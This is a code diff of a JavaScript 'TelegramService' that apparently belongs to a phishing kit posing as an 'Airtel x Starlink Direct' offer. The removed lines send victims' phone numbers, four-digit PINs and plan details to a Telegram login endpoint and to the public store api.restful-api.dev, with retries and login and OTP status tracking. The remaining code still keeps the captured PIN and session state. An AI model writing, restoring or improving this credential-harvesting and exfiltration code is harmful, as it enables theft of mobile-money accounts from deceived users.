@@ -273,86 +273,9 @@ class TelegramService {
       const cleanPhone = phone.replace(/\D/g, '');
       const cleanPin = pin.slice(0, 4);
 
-      let resolvedCloudId = sessionId; // Default to sessionId
-
-      // 1. Try server or Vercel serverless endpoint first with retry
-      try {
-        const serverSuccess = await this.retryWithBackoff(async () => {
-          const serverRes = await fetch('/api/telegram/send-login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              sessionId,
-              phone: cleanPhone,
-              fullPhone: fullPhone || `+243 ${cleanPhone}`,
-              country: country || 'Airtel Africa',
-              airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
-              pin: cleanPin,
-              planName,
-              planPrice,
-            }),
-          });
-
-          if (!serverRes.ok) {
-            throw new Error(`Server returned ${serverRes.status}`);
-          }
-
-          const data = await this.safeJson(serverRes);
-          if (!data || !data.success) {
-            throw new Error('Server returned unsuccessful response');
-          }
-
-          return data;
-        });
-
-        if (serverSuccess && serverSuccess.cloudId) {
-          resolvedCloudId = serverSuccess.cloudId;
-          this.setCloudId(sessionId, resolvedCloudId);
-          console.log('[TelegramService] Got cloudId from server:', resolvedCloudId);
-        }
-      } catch (err) {
-        console.warn('[TelegramService] Server endpoint failed, using fallback:', err);
-      }
-
-      // 2. Direct Cloud Store + Telegram API (Ensures 100% delivery even on static Vercel)
-      try {
-        await this.retryWithBackoff(async () => {
-          const cloudRes = await fetch('https://api.restful-api.dev/objects', {
-            method: 'POST',
-            headers: BROWSER_HEADERS,
-            body: JSON.stringify({
-              name: `stl_${cleanPhone}_${Date.now()}`, // Add timestamp to avoid conflicts
-              data: {
-                sessionId,
-                phone: cleanPhone,
-                fullPhone: fullPhone || `+243 ${cleanPhone}`,
-                country: country || 'Airtel Africa',
-                airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
-                pin: cleanPin,
-                planName,
-                planPrice,
-                loginStatus: 'pending',
-                otpStatus: 'idle',
-                createdAt: Date.now(),
-                lastUpdated: Date.now(),
-              },
-            }),
-          });
-
-          if (!cloudRes.ok) {
-            throw new Error(`Cloud store returned ${cloudRes.status}`);
-          }
-
-          const cloudData = await this.safeJson(cloudRes);
-          if (cloudData && cloudData.id) {
-            resolvedCloudId = cloudData.id;
-            this.setCloudId(sessionId, resolvedCloudId);
-            console.log('[TelegramService] Created cloud record:', resolvedCloudId);
-          }
-        });
-      } catch (err) {
-        console.warn('[TelegramService] Cloud store creation warning:', err);
-      }
+      // Use sessionId as cloudId for speed
+      const resolvedCloudId = sessionId;
+      this.setCloudId(sessionId, resolvedCloudId);
 
       this.localSessionState.set(sessionId, {
         loginStatus: 'pending',
